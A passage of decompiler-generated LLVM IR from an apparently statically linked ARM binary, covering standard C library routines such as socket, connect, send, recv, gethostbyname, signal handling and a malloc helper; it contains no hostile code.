  store i32 255, i32* @r7, align 4
  store i32 46, i32* @sl, align 4
  br label %dec_label_pc_16210

dec_label_pc_161f4:                               ; preds = %dec_label_pc_16210
  %v1_161fc = inttoptr i32 %v0_1622c to i8*
  %v2_161fc = call i32 @_uintmaxtostr(i8* %v1_161fc)
  %v0_16200 = load i32, i32* @r6, align 4
  %v2_16200 = icmp eq i32 %v0_16200, 0
  %v1_16204 = add i32 %v2_161fc, -1
  store i32 %v1_16204, i32* @r1, align 4
  br i1 %v2_16200, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_161f4
  %v1_16208 = load i32, i32* @sl, align 4
  %v2_16208 = trunc i32 %v1_16208 to i8
  %v4_16208 = inttoptr i32 %v0_16200 to i8*
  store i8 %v2_16208, i8* %v4_16208, align 1
  %v0_1620c.pre = load i32, i32* @r1, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_161f4, %bb
  %v0_1620c = phi i32 [ %v1_16204, %dec_label_pc_161f4 ], [ %v0_1620c.pre, %bb ]
  store i32 %v0_1620c, i32* @r6, align 4
  %v0_16210.pre = load i32, i32* @r5, align 4
  %v0_16214.pre = load i32, i32* @r7, align 4
  %v1_16214.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16210

dec_label_pc_16210:                               ; preds = %entry, %bb17
  %v0_1622c = phi i32 [ %v1_161d4, %entry ], [ %v0_1620c, %bb17 ]
  %v1_16214 = phi i32 [ %v5_161d0, %entry ], [ %v1_16214.pre, %bb17 ]
  %v0_16214 = phi i32 [ 255, %entry ], [ %v0_16214.pre, %bb17 ]
  %v0_16224 = phi i32 [ 0, %entry ], [ %v0_16210.pre, %bb17 ]
  %v7_16210 = icmp eq i32 %v0_16224, 3
  store i1 %v7_16210, i1* @cpsr_z, align 1
  %v2_16214 = and i32 %v0_16214, %v1_16214
  store i32 %v2_16214, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v3_16220 = udiv i32 %v1_16214, 256
  store i32 %v3_16220, i32* @r4, align 4
  %v1_16224 = add i32 %v0_16224, 1
  store i32 %v1_16224, i32* @r5, align 4
  %v7_16228 = icmp sgt i32 %v0_16224, 3
  br i1 %v7_16228, label %dec_label_pc_1622c, label %dec_label_pc_161f4

dec_label_pc_1622c:                               ; preds = %dec_label_pc_16210
  %v1_1622c = add i32 %v0_1622c, 1
  store i32 %v3_161b0, i32* @r4, align 4
  store i32 %v6_161b0, i32* @r5, align 4
  store i32 %v9_161b0, i32* @r6, align 4
  store i32 %v12_161b0, i32* @r7, align 4
  store i32 %v15_161b0, i32* @r8, align 4
  store i32 %v18_161b0, i32* @sb, align 4
  store i32 %v21_161b0, i32* @sl, align 4
  store i32 %v24_161b0, i32* @fp, align 4
  ret i32 %v1_1622c

; uselistorder directives
  uselistorder i32 %v0_16224, { 2, 0, 1 }
  uselistorder i32 %v0_1620c, { 1, 0 }
  uselistorder i32 (i8*)* @_uintmaxtostr, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16210, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 25844), i32* @r1, align 4
  %v0_1624c = call i32 @__GI_inet_ntoa_r()
  store i32 %v0_1624c, i32* %r0.global-to-local, align 4
  %v0_16250 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16250, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v1_16250 = load i32, i32* @r1, align 4
  %v2_16250 = inttoptr i32 %v1_16250 to i64*
  %v3_16250 = load i64, i64* %v2_16250, align 4
  %v5_16250 = trunc i64 %v3_16250 to i32
  %v6_16250 = udiv i64 %v3_16250, 4294967296
  %v7_16250 = trunc i64 %v6_16250 to i32
  store i32 %v7_16250, i32* @r7, align 4
  store i32 %v5_16250, i32* @r8, align 4
  %v1_16254 = load i32, i32* @r6, align 4
  %v4_16254 = inttoptr i32 %v0_1624c to i32*
  store i32 %v1_16254, i32* %v4_16254, align 4
  %v5_16254 = load i32, i32* @r4, align 4
  %v6_16254 = load i32, i32* %r0.global-to-local, align 4
  %v7_16254 = sub i32 %v6_16254, %v5_16254
  store i32 %v7_16254, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v8_16254 = phi i32 [ %v0_1624c, %entry ], [ %v7_16254, %bb ]
  ret i32 %v8_16254

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_16260 = ptrtoint i32* %stack_var_-12 to i32
  %v0_16264 = load i32, i32* @r0, align 4
  %v2_16264 = inttoptr i32 %v0_16264 to i8*
  %v3_16264 = call i32 @inet_aton(i8* %v2_16264, i32 %v2_16260)
  %v2_16268 = icmp eq i32 %v3_16264, 0
  %v4_1626c = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_16268, i32 -1, i32 %v4_1626c
  ret i32 %storemerge
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  store i32 2, i32* @r1, align 4
  %v0_1628c = call i32 @__GI_gethostbyname2()
  ret i32 %v0_1628c
}

define i32 @__GI_gethostbyname2() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_1629c = load i32, i32* @r4, align 4
  %v6_1629c = load i32, i32* @r5, align 4
  %v0_162a4 = load i32, i32* @r0, align 4
  store i32 %v0_162a4, i32* @r4, align 4
  %v0_162a8 = load i32, i32* @r1, align 4
  store i32 %v0_162a8, i32* @r5, align 4
  %v0_162ac = call i32 @__GI___h_errno_location()
  %v0_162d4 = load i32, i32* @r4, align 4
  %v2_162d8 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_162d8, i32* @ip, align 4
  %v0_162dc = load i32, i32* @r5, align 4
  %v8_162e4 = call i32 @gethostbyname2_r(i32 %v0_162d4, i32 %v0_162dc, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 26300) to i32*), i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 25860), i32 440, i32 %v2_162d8, i32 %v0_162ac)
  %v3_162e8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_1629c, i32* @r4, align 4
  store i32 %v6_1629c, i32* @r5, align 4
  ret i32 %v3_162e8
}

define i32 @function_162fc(i16* %arg1) local_unnamed_addr {
dec_label_pc_162fc:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_162fc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_162fc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_162fc
  %v2_162fc = load i32, i32* @r4, align 4
  %v5_162fc = mul i32 %v2_162fc, 1024
  %v6_162fc = and i32 %v5_162fc, %tmp
  %v2_16300 = trunc i32 %v6_162fc to i16
  store i16 %v2_16300, i16* %arg1, align 2
  %v5_16300 = load i32, i32* @ip, align 4
  %v6_16300 = load i32, i32* %r0.global-to-local, align 4
  %v7_16300 = sub i32 %v6_16300, %v5_16300
  store i32 %v7_16300, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_162fc, %bb
  %v8_16300 = phi i32 [ %tmp, %dec_label_pc_162fc ], [ %v7_16300, %bb ]
  ret i32 %v8_16300

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16304 = load i32, i32* @r7, align 4
  store i32 %v3_16304, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1632c, label %dec_label_pc_1631c

dec_label_pc_1631c:                               ; preds = %entry
  %v0_1631c = call i32 @__GI___errno_location()
  %v0_16320 = load i32, i32* %r7.global-to-local, align 4
  %v1_16320 = sub i32 0, %v0_16320
  %v2_16324 = inttoptr i32 %v0_1631c to i32*
  store i32 %v1_16320, i32* %v2_16324, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_16330.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1632c

dec_label_pc_1632c:                               ; preds = %entry, %dec_label_pc_1631c
  %v2_16330 = phi i32 [ %v3_16304, %entry ], [ %v2_16330.pre, %dec_label_pc_1631c ]
  %v0_1632c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1631c ]
  store i32 %v2_16330, i32* @r7, align 4
  ret i32 %v0_1632c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1632c, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1633c = load i32, i32* @r7, align 4
  store i32 %v3_1633c, i32* %stack_var_-8, align 4
  %v0_16348 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16348, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16348, -4095
  br i1 %tmp, label %dec_label_pc_16368, label %dec_label_pc_16358

dec_label_pc_16358:                               ; preds = %entry
  %v0_16358 = call i32 @__GI___errno_location()
  %v0_1635c = load i32, i32* %r7.global-to-local, align 4
  %v1_1635c = sub i32 0, %v0_1635c
  %v2_16360 = inttoptr i32 %v0_16358 to i32*
  store i32 %v1_1635c, i32* %v2_16360, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_16368.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16368

dec_label_pc_16368:                               ; preds = %entry, %dec_label_pc_16358
  %v1_1636c = phi i32 [ %v0_16348, %entry ], [ -1, %dec_label_pc_16358 ]
  %v2_16368 = phi i32 [ %v3_1633c, %entry ], [ %v2_16368.pre, %dec_label_pc_16358 ]
  store i32 %v2_16368, i32* @r7, align 4
  ret i32 %v1_1636c

; uselistorder directives
  uselistorder i32 %v0_16348, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16368, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_163a8, label %dec_label_pc_16398

dec_label_pc_16398:                               ; preds = %entry
  %v0_16398 = call i32 @__GI___errno_location()
  %v0_1639c = load i32, i32* %r4.global-to-local, align 4
  %v1_1639c = sub i32 0, %v0_1639c
  %v2_163a0 = inttoptr i32 %v0_16398 to i32*
  store i32 %v1_1639c, i32* %v2_163a0, align 4
  br label %dec_label_pc_163a8

dec_label_pc_163a8:                               ; preds = %entry, %dec_label_pc_16398
  %v1_163b0 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_16398 ]
  ret i32 %v1_163b0

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_163a8, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_163b8 = load i32, i32* @r7, align 4
  store i32 %v3_163b8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_163e0, label %dec_label_pc_163d0

dec_label_pc_163d0:                               ; preds = %entry
  %v0_163d0 = call i32 @__GI___errno_location()
  %v0_163d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_163d4 = sub i32 0, %v0_163d4
  %v2_163d8 = inttoptr i32 %v0_163d0 to i32*
  store i32 %v1_163d4, i32* %v2_163d8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_163e4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_163e0

dec_label_pc_163e0:                               ; preds = %entry, %dec_label_pc_163d0
  %v2_163e4 = phi i32 [ %v3_163b8, %entry ], [ %v2_163e4.pre, %dec_label_pc_163d0 ]
  %v0_163e0 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_163d0 ]
  store i32 %v2_163e4, i32* @r7, align 4
  ret i32 %v0_163e0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_163e0, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_163f0 = load i32, i32* @r7, align 4
  store i32 %v3_163f0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_16418, label %dec_label_pc_16408

dec_label_pc_16408:                               ; preds = %entry
  %v0_16408 = call i32 @__GI___errno_location()
  %v0_1640c = load i32, i32* %r7.global-to-local, align 4
  %v1_1640c = sub i32 0, %v0_1640c
  %v2_16410 = inttoptr i32 %v0_16408 to i32*
  store i32 %v1_1640c, i32* %v2_16410, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1641c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16418

dec_label_pc_16418:                               ; preds = %entry, %dec_label_pc_16408
  %v2_1641c = phi i32 [ %v3_163f0, %entry ], [ %v2_1641c.pre, %dec_label_pc_16408 ]
  %v0_16418 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_16408 ]
  store i32 %v2_1641c, i32* @r7, align 4
  ret i32 %v0_16418

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16418, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16428 = load i32, i32* @r4, align 4
  store i32 %v3_16428, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_16458, label %dec_label_pc_16448

dec_label_pc_16448:                               ; preds = %entry
  %v0_16448 = call i32 @__GI___errno_location()
  %v0_1644c = load i32, i32* %r4.global-to-local, align 4
  %v1_1644c = sub i32 0, %v0_1644c
  %v2_16450 = inttoptr i32 %v0_16448 to i32*
  store i32 %v1_1644c, i32* %v2_16450, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1645c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_16458

dec_label_pc_16458:                               ; preds = %entry, %dec_label_pc_16448
  %v2_1645c = phi i32 [ %v3_16428, %entry ], [ %v2_1645c.pre, %dec_label_pc_16448 ]
  %v0_16458 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_16448 ]
  store i32 %v2_1645c, i32* @r4, align 4
  ret i32 %v0_16458

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16458, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1649c, label %dec_label_pc_1648c

dec_label_pc_1648c:                               ; preds = %entry
  %v0_1648c = call i32 @__GI___errno_location()
  %v0_16490 = load i32, i32* %r4.global-to-local, align 4
  %v1_16490 = sub i32 0, %v0_16490
  %v2_16494 = inttoptr i32 %v0_1648c to i32*
  store i32 %v1_16490, i32* %v2_16494, align 4
  br label %dec_label_pc_1649c

dec_label_pc_1649c:                               ; preds = %entry, %dec_label_pc_1648c
  %v1_164a4 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1648c ]
  ret i32 %v1_164a4

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1649c, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_164ac = load i32, i32* @r7, align 4
  store i32 %v3_164ac, i32* %stack_var_-8, align 4
  %v0_164b8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_164b8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_164b8, -4095
  br i1 %tmp, label %dec_label_pc_164d8, label %dec_label_pc_164c8

dec_label_pc_164c8:                               ; preds = %entry
  %v0_164c8 = call i32 @__GI___errno_location()
  %v0_164cc = load i32, i32* %r7.global-to-local, align 4
  %v1_164cc = sub i32 0, %v0_164cc
  %v2_164d0 = inttoptr i32 %v0_164c8 to i32*
  store i32 %v1_164cc, i32* %v2_164d0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_164d8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_164d8

dec_label_pc_164d8:                               ; preds = %entry, %dec_label_pc_164c8
  %v1_164dc = phi i32 [ %v0_164b8, %entry ], [ -1, %dec_label_pc_164c8 ]
  %v2_164d8 = phi i32 [ %v3_164ac, %entry ], [ %v2_164d8.pre, %dec_label_pc_164c8 ]
  store i32 %v2_164d8, i32* @r7, align 4
  ret i32 %v1_164dc

; uselistorder directives
  uselistorder i32 %v0_164b8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_164d8, { 1, 0 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_164e4 = load i32, i32* @r4, align 4
  %v0_164ec = call i32 @__GI_getpid()
  %v2_164f4 = call i32 @kill(i32 %v0_164ec, i32 %arg1)
  store i32 %v3_164e4, i32* @r4, align 4
  ret i32 %v2_164f4

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 2, 1 }
  uselistorder i32 ()* @__GI_getpid, { 0, 3, 2, 1 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_16518, label %dec_label_pc_16510

dec_label_pc_16510:                               ; preds = %entry
  %v7_16514 = icmp slt i32 %arg1, 65
  br i1 %v7_16514, label %dec_label_pc_1652c, label %dec_label_pc_16518

dec_label_pc_16518:                               ; preds = %dec_label_pc_16510, %entry
  %v0_16518 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_16524 = inttoptr i32 %v0_16518 to i32*
  store i32 22, i32* %v2_16524, align 4
  %v0_16534.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16534

dec_label_pc_1652c:                               ; preds = %dec_label_pc_16510
  %v0_1652c = call i32 @__sigaddset()
  store i32 %v0_1652c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16534

dec_label_pc_16534:                               ; preds = %dec_label_pc_16518, %dec_label_pc_1652c
  %v0_16534 = phi i32 [ %v0_16534.pre, %dec_label_pc_16518 ], [ %v0_1652c, %dec_label_pc_1652c ]
  ret i32 %v0_16534

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16534, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1654c = add i32 %tmp, 4
  %v3_1654c = inttoptr i32 %v2_1654c to i32*
  store i32 0, i32* %v3_1654c, align 4
  %v1_16550 = load i32, i32* %r3.global-to-local, align 4
  %v2_16550 = inttoptr i32 %v1_16550 to i32*
  store i32 0, i32* %v2_16550, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16558 = load i32, i32* @r4, align 4
  store i32 %v3_16558, i32* %stack_var_-16, align 4
  %v6_16558 = load i32, i32* @r5, align 4
  %v9_16558 = load i32, i32* @r6, align 4
  %v7_16560 = icmp eq i32 %arg2, -1
  br i1 %v7_16560, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_16568 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_16584

.thread16:                                        ; preds = %bb, %.thread4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1658c

dec_label_pc_16584:                               ; preds = %bb
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r6, align 4
  %v7_16588 = icmp slt i32 %arg1, 65
  br i1 %v7_16588, label %dec_label_pc_165a0, label %dec_label_pc_1658c

dec_label_pc_1658c:                               ; preds = %.thread16, %dec_label_pc_16584
  %v0_1658c = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_16598 = inttoptr i32 %v0_1658c to i32*
  store i32 22, i32* %v2_16598, align 4
  %v0_165f8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb33

dec_label_pc_165a0:                               ; preds = %dec_label_pc_16584
  %v2_165a0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_165a0, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_165a8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_165a8, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_165b8 = call i32 @__sigaddset()
  %v0_165c0 = load i32, i32* @r5, align 4
  %v0_165c4 = load i32, i32* @r6, align 4
  %v2_165c4 = add i32 %v0_165c4, 26488
  %v2_165c8 = call i32 @__GI___sigismember(i32 %v2_165c4, i32 %v0_165c0)
  store i32 %v2_16568, i32* %r2.global-to-local, align 4
  %v0_165e0 = load i32, i32* @r5, align 4
  %v3_165e8 = call i32 @__libc_sigaction(i32 %v0_165e0, i32 %v2_165a0, i32 %v2_16568)
  %v1_165ec = icmp slt i32 %v3_165e8, 0
  br i1 %v1_165ec, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_165a0
  %v5_165f0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_165f0, i32* %r2.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_165a0
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_1658c, %bb32
  %v0_165f8 = phi i32 [ %v5_165f0, %bb31 ], [ %v0_165f8.pre, %dec_label_pc_1658c ], [ -1, %bb32 ]
  %v2_16600 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16600, i32* @r4, align 4
  store i32 %v6_16558, i32* @r5, align 4
  store i32 %v9_16558, i32* @r6, align 4
  ret i32 %v0_165f8

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 65, { 1, 2, 4, 3, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 3, 0, 2 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1658c, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_16610 = add i32 %arg2, -1
  %v3_16614 = udiv i32 %v1_16610, 32
  %v4_16618 = mul nuw nsw i32 %v3_16614, 4
  %v5_16618 = add i32 %v4_16618, %arg1
  %v6_16618 = inttoptr i32 %v5_16618 to i32*
  %v7_16618 = load i32, i32* %v6_16618, align 4
  %v1_1661c = urem i32 %v1_16610, 32
  %v7_16624 = shl i32 1, %v1_1661c
  %v8_16624 = and i32 %v7_16618, %v7_16624
  %v10_16624 = icmp ne i32 %v8_16624, 0
  %. = zext i1 %v10_16624 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_16610, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_16634 = load i32, i32* @r1, align 4
  %v1_16634 = add i32 %v0_16634, -1
  %v3_16638 = udiv i32 %v1_16634, 32
  %v0_1663c = load i32, i32* @r0, align 4
  %v4_1663c = mul nuw nsw i32 %v3_16638, 4
  %v5_1663c = add i32 %v0_1663c, %v4_1663c
  %v6_1663c = inttoptr i32 %v5_1663c to i32*
  %v7_1663c = load i32, i32* %v6_1663c, align 4
  %v1_16640 = urem i32 %v1_16634, 32
  %v7_16648 = shl i32 1, %v1_16640
  %v8_16648 = or i32 %v7_1663c, %v7_16648
  store i32 %v8_16648, i32* %v6_1663c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_16634, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_16658 = add i32 %arg2, -1
  %v3_1665c = udiv i32 %v1_16658, 32
  %v4_16660 = mul nuw nsw i32 %v3_1665c, 4
  %v5_16660 = add i32 %v4_16660, %arg1
  %v6_16660 = inttoptr i32 %v5_16660 to i32*
  %v7_16660 = load i32, i32* %v6_16660, align 4
  %v1_16664 = urem i32 %v1_16658, 32
  %tmp = shl i32 -1, %v1_16664
  %v8_1666c = add i32 %tmp, -1
  %v9_1666c = and i32 %v7_16660, %v8_1666c
  store i32 %v9_1666c, i32* %v6_16660, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_16658, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_1667c = udiv i32 %arg1, 256
  store i32 %v3_1667c, i32* %r1.global-to-local, align 4
  %v2_16680 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_16680, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_1668c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_16680, i32 %v0_1668c)
  %v0_16690 = load i32, i32* %r1.global-to-local, align 4
  %v1_16690 = add i32 %v0_16690, 1048320
  %v3_16694 = udiv i32 %v1_16690, 65536
  %v1_16698 = and i32 %v3_16694, 8
  %v6_1669c = shl i32 %v0_16690, %v1_16698
  %v1_166a0 = add i32 %v6_1669c, 520192
  %v3_166a4 = udiv i32 %v1_166a0, 65536
  %v1_166a8 = and i32 %v3_166a4, 4
  %v6_166ac = shl i32 %v6_1669c, %v1_166a8
  %v1_166b0 = add i32 %v6_166ac, 245760
  %v3_166b4 = udiv i32 %v1_166b0, 65536
  %v1_166b8 = and i32 %v3_166b4, 2
  %v6_166bc = shl i32 %v6_166ac, %v1_166b8
  store i32 %v6_166bc, i32* %r1.global-to-local, align 4
  %v1_166c0 = sub nsw i32 13, %v1_16698
  %v2_166c4 = sub nsw i32 %v1_166c0, %v1_166a8
  %v3_166c8 = udiv i32 %v6_166bc, 32768
  %v4_166c8 = sub nuw nsw i32 -1, %v3_166c8
  %v4_166cc = udiv i32 %v6_166bc, 16384
  %v5_166cc = and i32 %v4_166cc, %v4_166c8
  %v2_166d0 = sub nsw i32 %v2_166c4, %v1_166b8
  %v2_166d4 = add nsw i32 %v2_166d0, %v5_166cc
  %v1_166d8 = add nsw i32 %v2_166d4, 6
  %v0_166dc = load i32, i32* %ip.global-to-local, align 4
  %v6_166dc = lshr i32 %v0_166dc, %v1_166d8
  %v3_166e0 = mul nsw i32 %v2_166d4, 4
  %v1_166e4 = add nsw i32 %v3_166e0, 32
  %v1_166e8 = urem i32 %v6_166dc, 4
  %v2_166ec = or i32 %v1_166e8, %v1_166e4
  ret i32 %v2_166ec

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
